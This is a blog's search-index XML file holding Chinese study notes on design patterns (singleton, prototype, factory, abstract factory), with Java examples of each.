<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>23种设计模式（1）-单例模式</title>
    <url>/2021/10/24/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%881%EF%BC%89-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>属于创建型模式，提供了一种创建对象的最佳方式。涉及到一个单一的类，该类负责创建自己的对象，同时保证只有单个对象被创建。</p>
<p><strong>注意：</strong></p>
<ul>
<li>单例类只能有一个实例</li>
<li>单例类必须自己创建自己的唯一实例</li>
<li>单例类必须给所有其他对象提供这一实例</li>
</ul>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>主要解决：</strong>一个全局使用的类的对象被频繁地创建于销毁</p>
<p><strong>何时使用：</strong>想要控制某个类的实例的数目，节省系统资源的时候</p>
<p><strong>关键：</strong>构造函数私有</p>
<p><strong>自己加的理解：</strong>在程序中，对象销毁之后，重新创建对象不叫单例模式（这种可以通过同步机制实现）；<strong>只有程序运行期间，一个类只创建一次对象，且只有这一个对象，才叫单例模式</strong></p>
<h2 id="几种实现方式"><a href="#几种实现方式" class="headerlink" title="几种实现方式"></a>几种实现方式</h2><h3 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h3><p>优点：避免了多线程的同步问题</p>
<p>缺点：容易产生垃圾对象；可以通过<strong>反射</strong>破解，构造出新的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungryMan</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HungryMan hungryMan = <span class="keyword">new</span> HungryMan();		<span class="comment">//预先创建好实例</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungryMan</span><span class="params">()</span> </span>&#123;		<span class="comment">//构造函数私有化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungryMan <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hungryMan;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DCL懒汉式（DCL，即double-checked-locking）"><a href="#DCL懒汉式（DCL，即double-checked-locking）" class="headerlink" title="DCL懒汉式（DCL，即double-checked locking）"></a>DCL懒汉式（DCL，即double-checked locking）</h3><p>优点：①使用DCL懒汉式，可以保证程序在多线程情况下，也是可以正确运行的</p>
<p>​            ②由于获取锁需要消耗资源，所以在<code>synchronized</code>加锁外面再套一层if判断</p>
<p>缺点：还是<strong>防不了反射</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMan</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> LazyMan lazyMan;		<span class="comment">//保证是一个原子性操作，避免指令重排</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyMan</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LazyMan <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazyMan == <span class="keyword">null</span>)&#123;		<span class="comment">//先进行一层判断，避免每次都要获取锁的过程，不能因为每次都在锁外面等候，大大提高效率</span></span><br><span class="line">            <span class="keyword">synchronized</span> (LazyMan.class) &#123;		<span class="comment">//同步获取HungryMan的锁，解决多线程问题（第一重锁）</span></span><br><span class="line">                <span class="keyword">if</span> (lazyMan == <span class="keyword">null</span>) &#123;		<span class="comment">//保证只有一个实例对象，但不是原子性操作（第二重锁）</span></span><br><span class="line">                    lazyMan = <span class="keyword">new</span> LazyMan();</span><br><span class="line">                   <span class="comment">/**</span></span><br><span class="line"><span class="comment">                    * 1、分配内存空间</span></span><br><span class="line"><span class="comment">                    * 2、执行构造方法，初始化对象</span></span><br><span class="line"><span class="comment">                    * 3、把这个对象指向这个空间</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazyMan;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="枚举（最佳）"><a href="#枚举（最佳）" class="headerlink" title="枚举（最佳）"></a>枚举（最佳）</h2><p>优点：<strong>避免多线程同步问题</strong>、<strong>支持自动序列化机制</strong>、<strong>防止反序列化</strong>、也<strong>不能通过反射构造对象</strong></p>
<p>机制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">EnumMan</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> EnumMan <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在枚举中，可以直接获得实例化对象，将实例化对象作为枚举中的要素，可以<strong>将要单例的类直接设置为枚举类型</strong></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>同步锁</tag>
        <tag>反射</tag>
        <tag>enum枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（0）-总览</title>
    <url>/2021/10/20/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%880%EF%BC%89-%E6%80%BB%E8%A7%88/</url>
    <content><![CDATA[<h2 id="设计模式的分类"><a href="#设计模式的分类" class="headerlink" title="设计模式的分类"></a>设计模式的分类</h2><span id="more"></span>

<p>总体来说，设计模式分为三大类：</p>
<p><strong>创建型模式，共五种：</strong>工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式</p>
<p><strong>结构型模式，共七种：</strong>适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</p>
<p><strong>行为性模式，共十一种：</strong>策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式。</p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>设计模式总览</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（3）-原型模式</title>
    <url>/2021/11/01/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%883%EF%BC%89-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>原型模式是用于<strong>创建重复的对象</strong>，同时又能保证性能。</p>
<p><strong>意图：</strong>用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><p>主要有两种情况：一种是<strong>浅克隆</strong>；一种是<strong>深克隆</strong>。</p>
<h3 id="浅克隆"><a href="#浅克隆" class="headerlink" title="浅克隆"></a>浅克隆</h3><p><strong>主要理解：</strong>创建一个新对象，新对象的属性和原来对象完全相同，<strong>对于非基本类型属性，仍指向原有属性所指向的对象的内存地址</strong></p>
<p><strong>前提：</strong>实现Cloneable接口</p>
<p><strong>关键代码：</strong>重写Object对象的clone()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        Person person1 = (Person) person.clone();   <span class="comment">//克隆一个对象</span></span><br><span class="line">        System.out.println(person == person1);      <span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/01/3mPiehFbIwtHou8.png" alt="image-20211101201003624"></p>
<ul>
<li><p>运行结果显示false，克隆后返回的的对象和原来的对象是两个对象</p>
</li>
<li><p>但是对于非基本类型属性，仍指向原来属性所指向的对象的地址（解决方法看深克隆的重写clone方法）</p>
</li>
</ul>
<h3 id="深克隆"><a href="#深克隆" class="headerlink" title="深克隆"></a>深克隆</h3><p><strong>主要理解：</strong>创建一个新对象，<strong>属性中的引用的其他对象也会被克隆，不再指向原有对象的地址</strong></p>
<h4 id="重写clone-方法"><a href="#重写clone-方法" class="headerlink" title="重写clone()方法"></a>重写clone()方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthday</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthday</span><span class="params">(Date birthday)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">null</span>;</span><br><span class="line">        person = (Person) <span class="keyword">super</span>.clone();</span><br><span class="line">        <span class="comment">//经修改，克隆Person的对象的时候，内部的非基本类型属性也会被克隆，并将引用地址给到克隆出来的对象的属性中</span></span><br><span class="line">        <span class="comment">//如此一来，就可以实现在修改克隆后的对象时，不会影响原来的对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getBirthday() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            person.setBirthday((Date) <span class="keyword">this</span>.getBirthday().clone());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过重写clone方法，将对象中非基本类型属性也clone一下</strong>（如果非基本类型属性是一个对象，且其还有其他非基本类型属性，则需继续将非基本类型属性的clone方法也进行重写，即“套娃”）</p>
<h4 id="反序列化方式"><a href="#反序列化方式" class="headerlink" title="反序列化方式"></a><a href="https://liu-ruyang.github.io/2021/11/01/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化方式</a></h4><p><strong>前提：</strong>被序列化和反序列化的类需要<strong>实现Serializable接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthday</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthday</span><span class="params">(Date birthday)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        Person person1 = (Person) Util.clone(person);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现序列化和反序列化深克隆的工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">clone</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用数组作为中间数据过渡的工具</span></span><br><span class="line">        <span class="comment">//Byte[] bytes = new Byte[1024 * 10];</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="comment">//也可以不用此输入流，换用其他输入流，并且用一个字节数组来代替其作用</span></span><br><span class="line">        ByteArrayOutputStream stream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="comment">//使用ObjectOutputStream的writeObject进行序列化</span></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(stream);</span><br><span class="line">        objectOutputStream.writeObject(obj);        <span class="comment">//写进了stream流</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//首先将存入stream输出流中的数据转为字节数组，然后用一个输入流读取其数据</span></span><br><span class="line">        ByteArrayInputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(stream.toByteArray());</span><br><span class="line">        <span class="comment">//使用ObjectInputStream的writeObject进行序列化</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        Object object = objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/01/gtKLRAHhnwfNY1E.png" alt="image-20211101222809004"></p>
<ul>
<li>上述序列化和反序列化的实现操作，可以放在单独的工具类中，也可以放在clone方法中（但这样需要实现Cloneable接口）</li>
<li><strong>其中，如果对象由非基本类型属性，则非基本类型属性也需要实现Serializable接口</strong></li>
</ul>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ol>
<li>资源优化场景</li>
<li>类初始化需要小号非常多的资源（包括数据、硬件资源等）</li>
<li>性能和安全要求的场景</li>
<li>通过new产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式</li>
<li>一个对象多个修改这的场景</li>
<li><strong>实际项目中，原型模式很少单独出现，一般是和工厂模式一块出现：通过clone方法创建一个对象，然后由工厂方法提供给调用者使用</strong></li>
</ol>
<hr>
<hr>
<h2 id="补充：Object类的clone方法为什么一定要实现Cloneable接口？"><a href="#补充：Object类的clone方法为什么一定要实现Cloneable接口？" class="headerlink" title="补充：Object类的clone方法为什么一定要实现Cloneable接口？"></a>补充：Object类的clone方法为什么一定要实现Cloneable接口？</h2><p>我们看官方对Object类的clone方法的说明：</p>
<p><img src="https://i.loli.net/2021/11/01/83ExX7eQjhaOnMT.png" alt="image-20211101201632351"></p>
<p>翻译后：</p>
<p><img src="https://i.loli.net/2021/11/01/iK7WbqhYljsCy1k.png" alt="image-20211101201710704"></p>
<p><strong>我的理解：</strong>clone方法是在Cloneable接口中声明的，但是Object类本身没有实现这个接口，所以如果直接调用Object的clone方法（不继承Cloneable接口），则会包运行时异常CloneNotSupportedException。</p>
<p>在Cloneable接口中也有明确说明，翻译后：</p>
<p><img src="https://i.loli.net/2021/11/01/yNiuhGnzUkcRlT6.png" alt="image-20211101201958556"></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>Cloneable接口</tag>
        <tag>序列化和反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（2）-工厂模式</title>
    <url>/2021/10/20/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%882%EF%BC%89-%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>工厂模式属于<strong>创建型模式</strong>，它提供了一种创建对象的最佳方式。</p>
<p>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>作用：</strong>实现了创建者和调用者的分离</p>
<p><strong>满足的OOP七大原则：</strong></p>
<ul>
<li>开闭原则</li>
<li>依赖倒置原则</li>
<li>迪米特法则</li>
</ul>
<p><strong>核心本质：</strong></p>
<ul>
<li>实例化对象不使用new，用工厂方法代替</li>
<li>将选择实现类，创建对象统一管理和控制。从而将调用者和我们的实现类解耦</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>对于复杂类，推荐使用工厂模式</li>
<li>对于简单类，特别是只需要通过new就可以完成创建的对象，无需使用工厂模式（如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度）</li>
</ul>
<h2 id="详细分类"><a href="#详细分类" class="headerlink" title="详细分类"></a>详细分类</h2><h3 id="简单工厂模式（静态工厂模式）"><a href="#简单工厂模式（静态工厂模式）" class="headerlink" title="简单工厂模式（静态工厂模式）"></a>简单工厂模式（静态工厂模式）</h3><p><strong>一句话介绍：</strong>①增加一个中间工厂类，用于创建产品对象 ②方法是静态的</p>
<p><strong>不推荐使用</strong></p>
<ul>
<li>之所以静态工厂模式，是因为工厂的方法是静态的方法</li>
<li>对于新增的产品，需要去覆盖已经存在的代码</li>
<li>用来生产<strong>同一等级结构</strong>中的任意产品</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小汽车实现汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">smallCar</span> <span class="keyword">implements</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;smallCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大汽车实现汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">largeCar</span> <span class="keyword">implements</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;largeCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//静态工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//方式一：根据传入的参数决定汽车的类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getCar</span><span class="params">(String car)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (car) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;smallCar&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> smallCar();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;largeCar&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> largeCar();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//方式二：根据调用的方法决定汽车的类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getSmallCar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> smallCar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getLargeCar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> largeCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CarFactory.getCar(<span class="string">&quot;smallCar&quot;</span>).printName();</span><br><span class="line">        CarFactory.getSmallCar().printName();</span><br><span class="line">        CarFactory.getLargeCar().printName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的是静态工厂的写法，根据调用者传入给静态工厂的参数（或者根据调用的方法），从而决定创建的是何种汽车类型</p>
<p>虽然看起来简单，但是有缺点</p>
<ul>
<li>不满足开闭原则（维护复杂）</li>
</ul>
<h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p><strong>一句话介绍：</strong>①增加一个中间工厂接口 ②每增加一种产品，就要增加一个对应工厂类实现工厂接口 ③创建产品工作交给工厂完成</p>
<ul>
<li>用来生产<strong>同一等级结构</strong>中的任意产品</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小汽车</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallCar</span> <span class="keyword">implements</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;smallCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大汽车</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LargeCar</span> <span class="keyword">implements</span>  <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;largeCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//工厂接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">Car <span class="title">getCar</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建SmallCar的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallCarFactory</span> <span class="keyword">implements</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">getCar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SmallCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建LargeCar的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LargeCarFactory</span> <span class="keyword">implements</span> <span class="title">CarFactory</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">getCar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LargeCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//用小汽车工厂生产小汽车</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> SmallCarFactory().getCar());</span><br><span class="line">        <span class="comment">//用大汽车工厂生产大汽车</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> LargeCarFactory().getCar());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点：</strong></p>
<ol>
<li>一个调用者想创建一个对象，只要知道其名称就可以了</li>
<li>扩展性高（因为满足开闭原则），如果想要增加一个产品，只要扩展一个工厂类就可以</li>
<li>屏蔽产品的具体实现，调用者只关心产品的接口</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li>每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这不是什么好事。</li>
</ol>
<h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p>也是一种<strong>创建型模式</strong></p>
<p><strong>一句话介绍：</strong>围绕一个超级工厂创建其他工厂。该超级工厂又称为工厂的工厂。</p>
<p>具体介绍转战到另一篇博客：<a href="https://liu-ruyang.github.io/2021/12/02/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%885%EF%BC%89-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/">23种设计模式（5）-抽象工厂模式</a></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（5）-抽象工厂模式</title>
    <url>/2021/12/02/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%885%EF%BC%89-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>抽象工厂模式属于创建型模式，提供了一种创建对象的最佳创建方式。</p>
<p>抽象工厂模式，是一个超级工厂，用于创建其他工厂的工厂。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>用途：</strong>提供一个创建<strong>一系列相关或相互依赖</strong>对象的接口，而无需指定他们具体的类</p>
<p><strong>何时使用：</strong>系统的产品有多于一个的产品族，而系统只消费其中某一族的产品</p>
<p><strong>本质：抽象工厂模式是工厂方法模式的升级版；工厂方法模式针对的是只有一个产品族；而当产品族不止一个的时候，工厂方法模式就升级成了抽象工厂模式</strong></p>
